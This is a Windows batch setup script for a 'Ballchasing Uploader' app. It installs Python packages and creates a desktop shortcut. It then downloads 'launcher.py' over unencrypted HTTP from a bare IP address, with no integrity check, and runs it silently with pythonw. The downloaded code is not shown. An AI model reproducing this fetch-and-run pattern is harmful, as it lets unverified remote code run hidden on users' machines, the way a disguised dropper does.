@echo off
setlocal
title Ballchasing Uploader

:: ── Location check ─────────────────────────────────────────────────────────────
echo "%~dp0" | findstr /i "\\Downloads\\" >nul
if not errorlevel 1 goto :wrong_location
echo "%~dp0" | findstr /i "\\Desktop\\" >nul
if not errorlevel 1 goto :wrong_location
goto :checks

:wrong_location
echo.
echo  [!]  Do not run this from your Downloads folder or Desktop.
echo.
echo  Please do this first:
echo    1. Create a permanent folder, e.g.  C:\BallchasingUploader
echo    2. Move start.bat into that folder
echo    3. Run start.bat from there
echo.
echo  This keeps all app files together in one place.
echo.
pause
exit /b

:checks
:: ── Python check ───────────────────────────────────────────────────────────────
python --version >nul 2>&1
if errorlevel 1 (
    echo.
    echo  Python not found.
    echo  Install from https://www.python.org/downloads/
    echo  Make sure "Add Python to PATH" is checked during install.
    echo.
    pause
    exit /b
)

:: ── Python dependencies ────────────────────────────────────────────────────────
if not exist "%~dp0src\lib\" (
    echo Installing dependencies...
    pip install requests customtkinter pillow -q --target "%~dp0src\lib"
    if errorlevel 1 (
        echo Failed to install dependencies.
        pause
        exit /b
    )
    echo Done.
)

:: ── Download launcher from server ─────────────────────────────────────────────
if not exist "%~dp0launcher.py" (
    echo Downloading launcher...
    powershell -NoProfile -Command ^
        "try { Invoke-WebRequest 'http://46.101.184.78:8766/launcher' -OutFile '%~dp0launcher.py' -UseBasicParsing } catch { exit 1 }"
    if not exist "%~dp0launcher.py" (
        echo Failed to download launcher. Check your internet connection.
        pause
        exit /b
    )
    echo Done.
)

:: ── Desktop shortcut ──────────────────────────────────────────────────────────
powershell -NoProfile -Command "$ws=New-Object -ComObject WScript.Shell; $s=$ws.CreateShortcut([Environment]::GetFolderPath('Desktop')+'\Ballchasing Uploader.lnk'); $s.TargetPath='%~dp0start.bat'; $s.WorkingDirectory='%~dp0'; $s.Description='Ballchasing Auto Uploader'; $s.Save()" >nul 2>&1

:: ── Launch (no console window) ───────────────────────────────────────────────
for /f "delims=" %%P in ('python -c "import sys,os; print(os.path.join(os.path.dirname(sys.executable),'pythonw.exe'))"') do set PYTHONW=%%P

if exist "%PYTHONW%" (
    start "" "%PYTHONW%" "%~dp0launcher.py"
) else (
    start "" python "%~dp0launcher.py"
)
exit
